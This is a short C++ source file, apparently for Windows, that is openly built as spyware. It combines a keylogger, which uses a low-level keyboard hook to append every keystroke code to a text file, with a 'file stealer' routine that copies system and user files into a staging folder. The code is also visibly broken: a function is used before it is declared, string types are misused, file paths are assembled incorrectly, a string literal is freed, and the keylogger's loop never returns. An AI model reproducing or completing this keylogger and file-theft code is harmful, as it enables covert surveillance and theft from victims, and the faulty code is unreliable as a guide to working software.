#include <windows.h>
#include <fstream>
#include <string>

// Function to log keystrokes.
void keylogger() {
    HHOOK hhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyLoggerProc, 0, 0);
    if (!hhook)
        return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhook);
}

// Keylogger callback function
LRESULT CALLBACK keyLoggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0)
        return CallNextHookEx(NULL, nCode, wParam, lParam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lParam;
    
    // Log keystrokes
    std::ofstream logFile("keystrokes.txt", std::ios_base::app);
    logFile << kbs->vkCode;

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to steal files from the system.
void fileStealer() {
    char* path = "C:\\stealme";
    if (!PathFileExists(path)) {
        CreateDirectory(path, 0);
    }

    // List of files to copy
    std::string fileList[] = { "C:\\Windows\\System32\\drivers\\etc\\hosts", 
                               "C:\\Users\\Public\\Documents\\example.txt",
                               "C:\\ProgramData\\malware.exe" };

    for (std::string file : fileList) {
        char* destFile = (char*)malloc(strlen(path) + strlen(file) + 1);
        sprintf(destFile, "%s\\%s", path, file);

        std::ifstream src(file);
        std::ofstream dest(destFile);
        if (!src || !dest)
            continue;

        dest << src.rdbuf();
        src.close();
        dest.close();
    }

    free(path);
}

// Main function
int main() {
    keylogger();
    fileStealer();

    return 0;
}
